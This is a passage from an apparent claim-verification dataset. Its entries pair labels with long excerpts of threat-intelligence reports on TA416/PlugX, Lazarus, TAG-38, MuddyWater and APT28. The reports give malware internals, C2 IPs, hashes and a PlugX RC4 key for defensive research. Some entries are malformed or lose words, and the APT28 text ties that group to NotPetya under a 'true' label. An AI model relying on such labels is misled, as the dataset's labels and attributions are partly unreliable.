        "explain": "Since 2020, Proofpoint researchers have observed TA416, an actor assessed to be aligned with the Chinese state, utilizing web bugs to profile their targets. Commonly referred to as tracking pixels, web bugs embed a hyperlinked non-visible object within the body of an email that, when enabled, will attempt to retrieve a benign image file from an actor controlled server. This provides a “sign of life” to threat actors and indicates that the targeted account is valid with the user being inclined to open emails that utilize social engineering content. TA416 has been using web bugs to target victims prior to delivering malicious URLs that have installed a variety of PlugX malware payloads. The operational tempo of these campaigns, specifically those against European governments, have increased sharply since Russian troops began amassing on the border of Ukraine.The use of the web bug reconnaissance technique suggests TA416 is being morediscerning about which targets the group chooes to deliver malware payloads.Historically, the group primarily delivered web bug URLs alongside malware URLs to confirm receipt. In 2022, the group started to first profile users and then deliver malware URLs. This may be an attempt by TA416 to avoid having their malicious tools discovered and publicly disclosed.By narrowing the lens of targeting from broad phishing campaigns to focus on targets that have proven to be active and willing to open emails, TA416 increases its chance of success when following up with malicious malware payloads.Starting in early November 2021, Proofpoint researchers identified web bug reconnaissance campaigns targeting European diplomatic entities. Notably this activity aligned with the escalation of tensions between Russia, Ukraine, and, by extension, NATO member states in Europe. The emails first originated from a spoofed sender that impersonated a Meetings Services Assistant at the United Nations General Assembly Secretariat. Proofpoint did not observe these campaigns targeting the United Nations (UN), but did observe the targeting of diplomatic entities in Europe under the pretense of communicating with the UN. The threat actor achieved this impersonation by utilizing the legitimate email marketing service SMTP2Go, which allows users to alter the envelope sender field while using a unique sender address generated by the service. TA416 has used SMTP2Go to impersonate various European diplomatic organizations since at least 2020. The threat actor in an August 2020 campaign impersonated the same Meetings Services Assistant at the UN General Assembly and again targeted governmental entities in Europe. In this historical campaign, TA416 delivered a DropBox URL that delivered a PlugX variant aligning with Recorded Future’s analysis of “Red Delta” PlugX malware. Proofpoint assesses that there is sizeable overlap between the entities TA416 and the publicly disclosed group “Red Delta.” Both campaigns from August 2020 and November 2021 targeted European diplomatic entities and utilized SMTP2Go to impersonate an external diplomatic organization that may communicate with the end targets. Included below is a publicly available malicious Zip file hash from August 2020 delivered via a DropBox URL which is attributable to TA416/Red Delta.Proofpoint researchers continued to identify web reconnaissance campaigns in November and December 2021 that utilized a rudimentary style of encoding and resource names. Fundamentally, a web bug URL includes infrastructure that hosts a benign image file, several designations about the email campaign, which can include date and campaign name, and a unique designation for each individual user targeted in the email campaign. This allows a threat actor to validate which recipients received and opened the phishing email. TA416 web bugs appear rudimentary while demonstrating slight evolution over time. The web bug URL structure began with an actor-controlled IP which retrieved jpg resources named after the email aliases of the targeted victims from the actor-controlled servers. Proofpoint researchers next observed base64 encoded values of the entire email address.Researchers identified the same method of base64 encoded target emails, including in the web bug URL, consistently from August to November 2020 in TA416 campaigns that preceded the delivery of PlugX malware. On more than one occasion in 2020, this web bug technique appeared in an email alongside a Dropbox URL that ultimately delivered the Trident Loader variant of PlugX malware. Proofpoint, Avira, and Recorded Future have publicly attributed this installation technique to TA416/Red Delta. In the above referenced campaign from August 2020 in which TA416 impersonated UN personnel, the threat actor utilized base64 encoded web bug resources representing targeted emails alongside the cloud hosted URLs that delivered PlugX malware. Actor-controlled IPs observed during web bug reconnaissance campaigns during the November to December 2021 period included the IP 45.154.14[.]235. Beginning on January 17, 2022, Proofpoint researchers observed TA416 threat actors utilizing the IP address 45.154.14[.]235 in phishing emails attempting to deliver a malicious Zip file to European Diplomatic entities. These entities had previously received web bug URLs in phishing emails during the prior months. Rather than the emails delivering further reconnaissance URLs, this IP now attempted to deliver malicious Zip files. The phishing email also included a Dropbox URL attempting to deliver the same malicious archive file. Like historical TA416 campaigns, the Zip file had a geopolitically themed title, which was shared with a PDF decoy that would be later downloaded as part of the infection chain. For example, the campaign on January 17, 2022 included the following Zip and PDF file titles:While historically TA416 has delivered Zip files from cloud hosting providers containing a decoy file, legitimate PE file, a DLL loader, and a PlugX malware configuration DAT file, recent campaigns used a different tactic. Proofpoint researchers noted that the malicious Zip files delivered from DropBox now contain a rudimentary executable which is a dropper malware. This malware establishes persistence for a legitimate executable file used in DLL search order hijacking, as well as initiates the download of four components. These components are included below and resemble the components used in the past to install PlugX malware. Public research has previously documented TA416’s propensity for including PlugX Trident Loader components and decoy in the initial delivered Zip file. Actors in recent months use a more convoluted delivery chain, in which a PE dropper is used to retrieve the Trident Loader components from an actor-controlled resource. The method of installing PlugX via DLL Search Order hijacking that displays a PDF decoy remains constant.Most recently on February 28, 2022, TA416 began using a compromised email address of a diplomat from a European NATO country to target a different country’s diplomatic offices. The targeted individual worked in refugee and migrant services. The below URL was sent in a phishing email and delivered a compressed archive containing a PE dropper. This dropper similarly called out to an actor-controlled URL to deliver a decoy document and the components of an updated Trident Loader PlugX malware payload.Close analysis of the delivered payloads and legitimate resources retrieved from URLs by the first stage malware dropper reveals that TA416 is once again using an updated version of PlugX malware to target their victims. Historically, the group has relied on a variety of legitimate antivirus files, including the Avast file resource wsc_proxy.exe, to begin the process of DLL search order hijacking that results in PlugX malware installation. In the January 2022 campaigns, TA416 used the PE file potplayermini.exe to initiate DLL search order hijacking. This is a legitimate executable file that is part of the publicly available media player Daum PotPlayer 1.5.29825, which Mandiant has previously documented as being susceptible to search order hijacking since at least 2016. Numerous Chinese APT groups, which are not directly correlated to TA416, have utilized it since that time. This campaign leveraged the vulnerability of potplayermini.exe to load the file PotPlayer.dll which contains an obfuscated launcher that in turn executes the file PotPlayerDB.dat. The file DocConvDll.dll has also intermittently been used as a loader of the PlugX DAT configuration files. For those that are familiar with TA416’s historic tactics, techniques, and procedures (TTPs), this is highly similar to the Trident Loader method which the group used to install PlugX in previous campaigns. While PotPlayerDB.dat is a variant of PlugX malware, TA416 has updated the payload by changing both its encoding method and expanding the payload’s configuration capabilities. Historically, TA416 relied on the DLL launcher to decode the PlugX payload utilizing an XOR key included at the offset 0 within the PlugX DAT configuration file. In this case, TA416 has abandoned that approach in favor of something with less dependencies that is more convoluted. The latest version contains obfuscation to thwart analysis. One of the main ways it does this is by resolving API functions during runtime. Generally, malware loads a DLL, iterates over the set of exports of the DLL and hashes the string, looking for a matching hash. This iteration of PlugX does standard API hashing, but only to resolve the address of the functions GetProcAddress as well as LoadLibrary. Once those functions are resolved properly, it loads the rest of the functions via their text name.In addition to this obfuscation attempt, most of the functions that contain the “business logic” of the malware are obfuscated with a state machine. At a high level this obscures the order of which blocks are executed within a function. It does this by maintaining a state variable with many comparisons in the function. After each block, the state variable is modified to whatever the subsequent block should be, making analysis more difficult. This sample further implements anti-analysis techniques via the malware’s design. After every iteration of the state machine, the malware sample will modify the state with a XOR operation. This makes it difficult to analyze as the states are not hardcoded as the result of a function. This control obfuscation is apparent below with the highly cyclical nature of the control flow graph.Once researchers defeated the PlugX anti-analysis techniques, they were able to examine the malware’s configuration. Notably the configuration contained three additional fields that were not present in the previous versions nor in standard PlugX malware. The new version included:In the past, when fields have been added to PlugX malware configurations they have persisted in future samples identified in subsequent campaigns. Recently, this has not always proven to be true. In recent campaigns, a consistent and clear configuration that is repeated has not been present. The expansion of the malware’s configuration fields demonstrates that this tool is undergoing additional development by TA416. Further, the type of added features that enable better filtering of victim files for exfiltration and better concealment from the infected user demonstrates that the actor is going beyond anti- analysis to create a more functional and precise tool to use during intrusions. It also indicates the varying versions of the PlugX payload that are being used in a short period of time.The January 2022 version of PlugX malware utilizes RC4 encryption along with a hardcoded key that is built dynamically. For communications, the data is compressed then encrypted before sending to the command and control (C2) server and the same process in reverse is implemented for data received from the C2 server. Below shows the RC4 key “sV!e@T#L$PH%” as it is being passed along with the encrypted data. The data is compressed and decompressed via LZNT1 and RtlDecompressBuffer. During the January 2022 campaigns, the delivered PlugX malware samples communicated with the C2 server 92.118.188[.]78 over port 187. In the February 2022 campaign, Proofpoint researchers observed a variation in which PlugX malware used an RC4 key that was sent to the bot in the first HTTP response which was then used to encrypt data going to the C2 server.In response to historical disclosures detailing TA416 PlugX malware infection and encoding methods, the group appears to have adopted a rapid rate of development for their PlugX payloads. While the distinctly TA416 installation method of a PE dropper retrieving Trident loaded payload components using a legitimate PE and a DLL loader file to load a PlugX payload remains constant, the components in this infection chain are regularly changing. The group uses different legitimate PE files to initiate sideloading, as well as a variety of PlugX DLL loaders including the PotPlayer and DocCon versions noted in this publication. TA416 also uses different variants of the final PlugX payload in which the communication routines are observed to be different when closely analyzed. Additionally, the payload DAT file decryption method has evolved regularly since the beginning of 2022. Several observed decryption schemas and a sample configuration are included below with date ranges detailing the evolution of observed PlugX payloads. Proofpoint researchers assess with high confidence that the operator identified in recent campaigns delivering PlugX malware is the same as previously identified in 2020 as part of Recorded Future's Red Delta campaign. This assessment is based on the use of the same email marketing service to deliver emails, the consistent impersonation of European diplomatic entities, the repetition of web bug patterns in the 2020, 2021, and 2022 campaigns, the consistent victimology observed between the campaigns, a nearly identical file naming structure observed between Zip and PDF decoy files, and the highly similar Trident Loader TTPs used for the execution of PlugX malware. The multiyear campaign against diplomatic entities in Europe suggests a consistent area of responsibility belonging to TA416. This mandate may have increased against entities in Europe during the current period of geopolitical conflict and economic upheaval in Europe. While historically the phishing tactics and tools of this group have not been so thoroughly explored, the consistent reliance on updating PlugX malware installation using the Trident Loader method belies a lack of innovation on the part of TA416 following several major publications surrounding this actor. TA416 has chosen to compensate for this lack of innovation with a greater tempo of variation. The group has proved to be pragmatic, making incremental and staggered changes to their PlugX toolkit rapidly and regularly altering a toolset it has used for the past number of years. Despite these variations, the group’s persistent targeting of a habitual target set paired with ingrained phishing tactics often leads to periodic discovery by threat researchers. Once TA416 reads this latest publication regarding their tactics, researchers at Proofpoint fully anticipate they will remain the metaphorical “Tubthumping” of the APT landscape. Researchers can publish their tactics but will never keep them down.\n\n\n",

        "claim": "The report by ClearSky details a multi-year cybercrime operation by the North Korean group LAZARUS, targeting cryptocurrency exchanges for significant financial theft.",
        "original_label": "true",
        "label": "true",
        "explain": "CryptoCore is an attack campaign against crypto-exchange companies that has been ongoing for three years and was discovered by ClearSky researchers. This cybercrime campaign is focused mainly on the theft of cryptocurrency wallets, and we estimate that the attackers have already made off with hundreds of millions of dollars. This campaign was also reported by additional companies and organizations, including JPCERT/CC1 , NTT Security2 and F-SECURE3 . The campaign is also known as CryptoMimic, Dangerous Password and Leery Turtle. In our report we attributed this campaign to a specific actor – North Korea’s LAZARUS APT Group. This attribution is a result of two stages of research.Our research shows a MEDIUM-HIGH likelihood that Lazarus group, a North-Korean, state-sponsored APT group, is attacking crypto exchanges all over the world and in Israel for at least three years. This group is has successfully hacked into numerous companies and organizations around the world for many years. Until recently this group was not known to attack Israeli targets.We would like to thank NTT Security Japan for sharing malware samples with us, and for their feedback on this research.LAZARUS AKA APT38, Hidden Cobra, Whois Team, ZINC and others is a North Korean APT group active since at least 2009. The group’s focus is mainly espionage, political attacks (anti-US and anti-South Korea, mostly) and financial, especially cryptocurrency wallets attack. According to the FBI this group is state-sponsored and is a part of North Korea’s RGB intelligence agency.On June 2020, we released a detailed report about a three-year-old campaign targeting crypto-exchanges in Israel, US, Europe, and Japan by unknown group which we dubbed CryproCore4 campaign. We also identified that the attackers behind this campaign stole millions of dollars’ worth of cryptocurrency wallets. While at the time, we did not attribute this campaign, our initial hypothesis was that this group is of Russian or other eastern-European origin. Parallel to our report, other cybersecurity firms released research papers describing similar attacks.By comparing these papers with what we know of the CryptoCore campaign, we found it possible that they are all referring to the same campaign, with each of the reports touching on parts of a large-scale attack. In this research paper we tried to connect the dots from all issued reports to full picture, and also attempted to support and expand F-SECURE’s attribution of this campaign to LAZARUS.The purpose of this research is the attribution of the CryptoCore campaign to a specific APT actor - LAZARUS. We did this in two steps: First step – We compared ClearSky’s CryptoCore’s research with three other research papers to find enough similarities to confidently say they are all referring to the same campaign:Second step – Having shown that the four research papers all refer to the same attack campaign, we accepted F-SECURE’s attribution of this campaign to LAZARUS by doing these corroborating tests: We started by comparing ClearSky’s CryptoCore research paper to two additional papers by F-SECURE and JPCERT/CC which seem to point to the same attack campaign and APT group. By comparing these research papers, we found that they share: Our working hypothesis is that since all three papers share many varied IoCs (domains, IPs, Files etc.) as well as the same VBS script, then they all point to the same attack campaign.The following 40 IOC’s were all found in both the ClearSky and F-SECURE papers.The following six IOC’s were all found in both the ClearSky and JPCERT/CC papers.As part of ClearSky’s CryptoCore research, we uncovered a VBS script used for connecting the attacked system with C&C servers and awaiting instructions. A nearly identical script was presented as part of F-SECURE’s research. Here are the two scripts, un-obfuscated, side by side.A reference is made in JPCERT/CC’s report to a very similar script, which operates in the same fashion and has the same parameters.Given the large amount of similar IOC’s and a virtually identical VBS script all found in ClearSky’s, F-SECURE’s and JPCERT/CC’s research papers, we can assume it is highly probable they are all referring to the same attack campaign.Another research paper we found to be related to the same attack campaign is by NTT SECURITY. To clearly say they are related, we searched for similarities between the RAT and STEALER tools found in NTT SECURITY’s and F-SECURE’s research papers. Our working hypothesis is that if the different malwares display many similarities, then NTT SECURITY’s research can also be said to relate to the same attack campaign. The above all show that the RAT found in NTT SECURITY’s research (msoRAT) was also used for the attacks in F-SECURE’s research. Another test we performed in whether YARA rules written by F-SECURE for the RAT and STEALER they identified in their research would apply to the RAT and STEALER identified by NTT SECURITY.Our test found that the answer to that is yes – F-SECURE’s rules did sign the tools found in NTT SECURITY’s research. This strengthens the hypothesis that these tools were created by the same actors.We can say with a high probability that NTT SECURITY’s research also deals with the same attack campaign and attacker as the other three research papers. This means that all four research papers are about the same attack campaign. After showing that all four research papers point to the same attack campaign, we attempted to reaffirm the hypothesis in F-SECURE’s paper attributing the campaign to LAZARUS. We did this by applying YARA rules for the RAT identified in F-SECURE’s report to a different RAT named “NukeSpeed” found in ESET’s report and verified as belonging to LAZARUS (SHA256 8b6887c5ec6fadaefee78f089e9a347a539bcedf52f5827f866a49a1839f8c4b).As we can see, the RC4 algorithm unique to LAZARUS and the backdoor for the RAT from F-SECURE’s research were both found in the RAT from ESET’s research. It is worth noting that in Fsecure’s report they reference a RAT from an older LAZARUS report from 2016, conducted by KASPERSKY (bbd703f0d6b1cad4ff8f3d2ee3cc073c). Attempting to apply F-SECURE’s backdoor YARA rule to the findings from this report will not work, but only because the 2016 backdoor accesses a file named “scaeve.dat” while in newer versions that has been changed to “perflog.dat”. Changing the file’s name would cause the YARA rule to apply to the 2016 research as well.We can see that our test for applying YARA rules from F-SECURE’s research to ESET’s and KASPERSKY’s research worked, and highly strengthens the attribution of these attacks to LAZARUS. During our research, we located several indicative and uncommon traits for LAZARUS tools that were part of the attack campaign: Similar traits for RAT.By being able to sign F-SECURE’s YARA rules to RATs associated with LAZARUS from ESET and KASPERSKY’s we have greatly strengthened F-SECURE’s attribution of the CryptoCore attack campaign to LAZARUS. In addition, we have located several indicative and uncommon traits in these tools all associated with LAZARUS. The above information means we can, with a high level of probability, attribute the CryptoCore attack campaign to LAZARUS.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "This report details a campaign conducted by a likely Chinese state-sponsored threat activity group targeting the Indian power sector. The activity was identified through a combination of large-scale automated network traffic analytics and expert analysis. Data sources include the Recorded Future Platform, SecurityTrails, PolySwarm, Team Cymru’s Pure Signal™, and common open-source tools and techniques. The report will be of most interest to individuals engaged in strategic and operational intelligence relating to Indian and Chinese cyber activity. Recorded Future notified the appropriate Indian government departments prior to publication of the suspected intrusions to support incident response and remediation investigations within affected organizations. With thanks to our colleagues at Dragos for early sharing and collaboration In February 2021, Recorded Future’s Insikt Group reported on intrusion activity targeting operational assets within India’s power grid that we attributed to a likely Chinese state-sponsored threat activity group we track as RedEcho. Following a short lull after the publication of our RedEcho reporting, we have detected ongoing targeting of Indian power grid organizations by China-linked adversaries, frequently using the privately shared modular backdoor ShadowPad. ShadowPad continues to be employed by an ever-increasing number of People’s Liberation Army (PLA) and Ministry of State Security (MSS)-linked groups, with its origins linked to known MSS contractors first using the tool in their own operations and later likely acting as a digital quartermaster. In recent months, we observed likely network intrusions targeting at least 7 Indian State Load Despatch Centres (SLDCs) responsible for carrying out real-time operations for grid control and electricity dispatch within these respective states. Notably, this targeting has been geographically concentrated, with the identified SLDCs located in North India, in proximity to the disputed India-China border in Ladakh. One of these SLDCs was also targeted in previous RedEcho activity. This latest set of intrusions, however, is composed of an almost entirely different set of victim organizations. In addition to the targeting of power grid assets, we also identified the compromise of a national emergency response system and the Indian subsidiary of a multinational logistics company by the same threat activity group. To achieve this, the group likely compromised and coopted internet-facing DVR/IP camera devices for command and control (C2) of Shadowpad malware infections, as well as use of the open source tool FastReverseProxy (FRP) Despite a partial troop disengagement between India and China from February 2021, the prolonged targeting of Indian critical infrastructure continues to raise concerns over prepositioning activity being conducted by Chinese adversaries. While this latest activity displays targeting and capability consistencies with previously identified RedEcho activity, there are also some notable distinctions. At this time, we have not identified technical evidence allowing us to attribute it to RedEcho, and we are currently clustering this latest activity under the temporary group name Threat Activity Group 38 (TAG-38)1 India continues to be a major target of Chinese cyber espionage activity, as detailed in historical Recorded Future reporting on RedDelta, RedEcho, RedFoxtrot, TAG-28, and additional client-facing research. Although tensions reduced, aided by partial troop disengagement, in February 2021 following prolonged border stand-offs in the Ladakh region, there has been limited progress between the states regarding respective territorial claims.Our February 2021 RedEcho report highlighted the compromise of 10 distinct Indian power sector organizations, including 4 of the 5 of the country’s Regional Load Despatch Centres (RLDC), 2 ports, a large generation operator, and other operational assets. These assets offer minimal value as economic espionage or other traditional intelligence targets, which led us to assess a likely goal of pre-positioning network access to support Chinese strategic objectives. Following that February 2021 report, we observed the group abandon the operational infrastructure highlighted and shift its infrastructure modus operandi. Despite this, evidence of targeting of Indian power assets and organizations with links to critical infrastructure from Chinese state-sponsored actors continued. This included the targeting of an Indian managed service provider (MSP) and operational technology (OT) vendor using ShadowPad, which aligns with activity described in recent Dragos reporting. We attribute this particular activity to a separate activity group we track as Threat Activity Group 26 (TAG-26). We have observed TAG-26 targeting multiple high-value organizations in India using ShadowPad, Poison Ivy, and the RoyalRoad RTF weaponizer. The use of ShadowPad across Chinese activity groups continues to grow over time, with new clusters of activity regularly identified using the backdoor as well as continued adoption by previously tracked clusters. At this time, we track at least 10 distinct activity groups with access to ShadowPad, which is assessed to have likely been originally developed and used by MSS-linked contractors linked to the APT41 (BARIUM) intrusion set. Since at least September 2021, we have observed TAG-38 intrusions targeting the identified victim organizations. The group has employed probable compromised infrastructure for command and control of ShadowPad implants used to target the identified networks, as well as using the open source tool Fast Reverse Proxy (FRP). Figure 3 highlights ongoing TAG-38 C2 detection and network traffic analysis exfiltration events from victim networks within the Recorded Future platform between September 2021 and March 2022.The identified victimology within this latest campaign is confined to Indian targets, specifically at least 7 SLDCs, the Indian subsidiary of a multinational logistics company, and a national emergency response system. As shown in Figure 4, the identified SLDCs were all located in Northern India, in proximity to the disputed China-India border in Ladakh. SLDCs are responsible for carrying out real-time operations for grid control and electricity dispatch within these respective states, similar to the Regional Load Despatch Centres (RLDCs) previously targeted in reported RedEcho activity. This makes these organizations critical for maintaining grid frequency and stability, with SLDCs maintaining access to supervisory control and data acquisition (SCADA) systems present across respective states for the purpose of grid control and electricity dispatch. At this time, we have not observed evidence of access to industrial control system (ICS) environments in this activity.Using a combination of proactive infrastructure detection techniques and network traffic analysis, we uncovered a cluster of C2 infrastructure engaged in this prolonged targeting of Indian critical infrastructure over several months. Based on our analysis, the adversary infrastructure cluster identified consists entirely of likely compromised internet-facing, third-party DVR/ IP camera devices. The compromise of often poorly secured internet-of-things (IOT) devices such as IP cameras for use in follow-on intrusion activity has previously been seen for threats ranging from Mirai-based botnets (1,2) to the Chinese state-sponsored threat activity group RedBravo (APT31/ZIRCONIUM). At this time, we have not determined the means in which these devices were originally compromised, which may include the use of default credentials. Using a series of analytical techniques and heuristics, we were able to cluster a network of these C2 IPs together, all of which matched all or most of the following criteria: While investigating the TAG-38 intrusion activity, we uncovered multiple links to other suspected Chinese state-sponsored activity. Of note, the targeting and use of ShadowPad is consistent with previously reported RedEcho activity, and this latest activity also includes a repeated SLDC victim. However, there were distinct differences in the infrastructure TTPs used in this latest campaign, and at this time we have not identified sufficient technical evidence tying these 2 activity groups together beyond the common targeting sets and capability use.The use of a shared SSL certificate (SHA1 fingerprint 0f6afc6e4e383883a6308fcf8d84b14a5bf4ccaf) exhibited on several TAG-38 servers was also notable. This SSL certificate was also identified historically on a few dozen other servers with links to Chinese cyber espionage activity. For example, one of the IP addresses historically exhibiting this certificate, 185.243.41[.]240, concurrently hosted several domains attributed to the group we track as TAG-26 referenced earlier in this report (including supership.dynv6[.]net, supermarket.ownip[.]net, and greatsong.soundcast[.]me). At this time, we believe it is unlikely that the use of this certificate is exclusive to a single activity group. This is based on wider context such as differing targeting patterns, infrastructure TTPs, and capability use linked to the infrastructure historically sighted exhibiting this certificate, which may instead be indicative of a shared capability.We recommend that users conduct the following measures to detect and mitigate activity associated with TAG-38 activity.Recorded Future continues to track Chinese state-sponsored activity groups targeting a wide variety of sectors globally. A large majority of this conforms to longstanding cyber espionage efforts, such as targeting of foreign governments, surveillance of dissident and minority groups, and economic espionage. However, the coordinated effort to target Indian power grid assets in recent years is notably distinct from our perspective and, given the continued heightened tension and border disputes between the two countries, we believe is a cause for concern. Based on the complexity present across national critical infrastructure systems, this often necessitates lengthy reconnaissance operations to better understand the inner workings of these systems, both in a technological and a physical sense. This is reflected in publicly documented targeted intrusion activity targeting industrial control system (ICS) networks historically, which can often span years. At this time, we have not identified evidence of compromise of ICS networks by TAG-38 operators from our visibility, although we cannot discount this possibility. Given the prolonged targeting of both SLDCs and RLDCs within India, first from RedEcho and now in this latest TAG-38 activity, we believe this targeting is a strategic priority for these actors and is likely to continue.\n\n\n",

        "explain": "This blog discusses targeted attacks against the Middle East taking place between February and October 2017 by a group Unit 42 is naming “MuddyWater”. This blog links this recent activity with previous isolated public reporting on similar attacks we believe are related. We refer to these attacks as MuddyWater due to the confusion in attributing these attacks. Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related. The MuddyWater attacks are primarily against Middle Eastern nations. However, we have also observed attacks against surrounding nations and beyond, including targets in India and the USA. MuddyWater attacks are characterized by the use of a slowly evolving PowerShell-based first stage backdoor we callThe Palo Alto Networks Unit 42 research team recently came across a series of malicious files whichThe malicious documents were adjusted according to the target regions, often using the logos of branches of local government, prompting the users to bypass security controls and enable macros. An overview of the technical changes seen in the past year is given in the graphic below, note that raw IOCs present in this graphic can be found as text in the Appendix at the end of this article. The attackers behind MuddyWater have been active throughout 2017, with targets across the Middle East and surrounding areas, examples of the decoy documents observed is given in Table 1. Of course, being named in a decoy document doesn’t mean any of these organizations have been attacked themselves or are involved in the attacks: the MuddyWater actors are abusing the trust these organizations’ names and/or logos command for their malicious purposes. All of these documents we observed and outlined above are related via:All of these documents we observed and outlined above are related via:The tools used by the MuddyWater attackers have been well documented by the previously cited research and a common theme of previous reporting was the open source nature of much of the toolset used by MuddyWater: Meterpreter, Mimikatz, Lazagne, Invoke-Obfuscation etc.. In some of their recent attack documents, the attackers also used GitHub as a hosting site for their custom backdoor, POWERSTATS. Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s).Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2. The POWERSTATS malware was compiled as an exe using P.However, this was a minor anomaly, as it was only seen in this case: raw scripts being used in all other cases. In some of the instances we observed what appeared to be compromised accounts at third party organizations sending the malware. In one case, the attackers sent a malicious document which was nearly identical to a legitimate attachment which we observed later being sent to the same recipient. This indicates that the attackers stole and modified a legitimate document from the compromised user account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it. This targeting of third party organizations to attack further targets is a risky move on the attackers’ part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7. FIN7 is a threat actor group that is financially motivated with targets in the restaurant, services and financial sectors. Following the trail of existing public reporting, the tie to FIN7 is essentially made based on a download observed from a MuddyWater C2, of a non-public tool “DNSMessenger”. For example, Morphisec wrote: “Later in our investigation, the same command server also delivered a variant of the DNS messenger similar to that described by Talos. The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE. The use of the DNSMessenger tool appears primarily linked to FIN7, with no other samples being attributable to MuddyWater. This led us to query the relationship between the newer attacks we were looking at and the alleged FIN7 link. As part of this research, we came up with the following hypotheses along with their likelihoods, and a rationale for each one. Whilst this may seem an attractive hypothesis to some, there are aspects on the technical side that simply don’t add up. Primarily, there are significant disparities between FIN7 and MuddyWater.When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity. We have attempted to find examples of code available in public data sources that would generate thevariation of the DNSMessenger malware and had little luck in doing so. Even though the code for DNSMessenger is publicly available following research into attackers published by 3 parties, attackers would have to write the corresponding server side to use it, and as such they may well choose to use the public DNS_TXT_Pwnage.ps1 script instead. Despite this, based on the chain of analysis above we cannot discount the notion that DNSMessenger is shared by multiple attackers, including FIN7 and MuddyWater.Little detail is given on the nature of how the connection between DNSMessenger and MuddyWater was discovered it isn’t possible for us to verify this link. The attackers realized they were under investigation and planted a false flag on their C2 server,uploading a copy of the FIN7 DNSMessenger code which had been previously mentioned (and was since publicly available) by FireEye and delivering it to researchers to trick them into mis-attributing the campaign. Indeed, the sample shared by Morphisec on PasteBin is identical to the one dropped bythe sample discussed in the FireEye FIN7 SEC campaign blog except for the final line.Whilst we could conclude with confidence that the attacks discussed in this article are not FIN7 related,we were not able to answer many of our questions about the MuddyWater attacks. We are currently unable to make a firm conclusion about the origin of the attackers, or the specific types of information they seek out once on a network. In any case we will continue to track their activities to provide protections for our customers.We hope the analysis presented shows the importance of drawing your own conclusions based on the data available to you, not just taking the conclusions given in the public domain at face value. This is especially true when actors who rely on slightly modified (and publicly available) open source tools are in play. Copycat threat actors can easily mimic attackers who use open source tools which can confuse attribution efforts meaning more than one aspect of the attacks observed must be considered when clustering.On top of this, whilst the vast majority of threat analysis in the public domain is repeatable and correct, in some cases it can be difficult to verify the analysis available. When it is hard to reproduce the analysis the confidence in any conclusions drawn must be lower than it would otherwise be, since you cannot know for sure that what is stated is true.

        "explain": "We are looking at the biggest threats on the cybersecurity scene - and the most nefarious hacker groups behind them - and this week the spotlight turns to APT28, or Fancy Bear. Don’t let the name fool you. There is nothing cute about Fancy Bear, also known as APT28, Pawn Storm, Sednit, STRONTIUM, and Sofacy. Just like John Wick is known in the Russian underworld as 'Baba Yaga,' this group has Russian roots and probably has additional names on that scene.APT28 is a notorious cyber espionage group that has been active since at least 2007. APT28 has been known to target governments, military organizations, and other high-value targets in various countries using their signature techniques. The group has been linked to several high-profile cyberattacks, including the alleged 2016 US presidential election hack and the 2017 NotPetya malware attack.One of the most notable campaigns associated with APT28 is the 2016 hack of the Democratic National Committee (DNC) in the United States. This attack resulted in the theft of sensitive emails and other information that were later leaked to the public and was seen as an attempt to interfere with the US presidential election. It was widely condemned. More recently, CISA said it discovered the Russian hacking group had infiltrated a satellite communications provider with critical infrastructure customers.APT28 is considered to be a highly sophisticated and well-funded state-sponsored group backed by the Russian government. The group has been the subject of several high-profile reports and warnings from cybersecurity companies and government agencies, including the US Department of Homeland Security. It targets governments, military organizations, media, research, and private sector companies for the purpose of gathering intelligence, stealing sensitive information, and criminal financial gain.APT28 is known for its use of advanced malware and hacking techniques to gain access to its targets’ networks. In addition to using advanced malware and spear-phishing tactics, the group is also known for using “watering hole” attacks, where it infects websites that are known to be frequented by targets. It also uses “living-off-the-land” tactics, whereby the group utilizes legitimate tools and infrastructure already present on a victim’s network in order to move laterally and evade detection.APT28 is known for using a variety of command and control (C2) infrastructure to communicate with its malware and to exfiltrate stolen data. This infrastructure often uses a combination of different protocols, such as HTTP and DNS, making it difficult to detect and block. One of the group’s most well-known tools is Sednit, which has been used in several APT28 campaigns. Sednit is a sophisticated piece of malware that can steal sensitive information and maintain a persistent presence on a victim’s network.The group also uses spear-phishing campaigns to target specific individuals and gain access to their networks. These campaigns often use social engineering tactics, such as sending emails that appear to be from a trusted source, to trick victims into clicking on malicious links or attachments.Organizations can protect themselves against APT28 and other advanced threat actors by implementing strong cybersecurity measures. These include:APT28 is one of the most serious threats in existence today, and it's important for organizations and individuals to be aware of its tactics in order to better protect themselves from attacks.\n\n\n",

Their operations involve slow, methodical strategies aimed at long-term system infiltration, employing tactics such as spear-phishing, credential harvesting, and advanced malware across multiple platforms. Fancy Bear's activities reflect the strategic interests of the Russian government, and they have been implicated in several high-profile cyberattacks globally, including on political and governmental targets. The group has developed proprietary tools, including the XAgent implant, and is known for exploiting zero-day vulnerabilities, allowing them to gain unauthorized access to systems before these security gaps can be patched. They have been responsible for significant cyber incidents like the DNC hack during the 2016 US Presidential Election, the German Bundestag intrusion, and the NotPetya malware attack, among others. Fancy Bear's methods include using encrypted attacks to evade detection, employing DDoS attacks, and leveraging brute-force campaigns against a wide range of targets. In response to the threat posed by Fancy Bear, Radware offers comprehensive cybersecurity solutions, including DDoS protection, encrypted attack protection, and an emergency response team for 24x7 support. Radware's services are designed to counteract the tactics used by Fancy Bear, providing real-time threat intelligence and protection to help organizations stay ahead of such sophisticated cyber threats.",

        "original_label": "true",
        "label": "true",
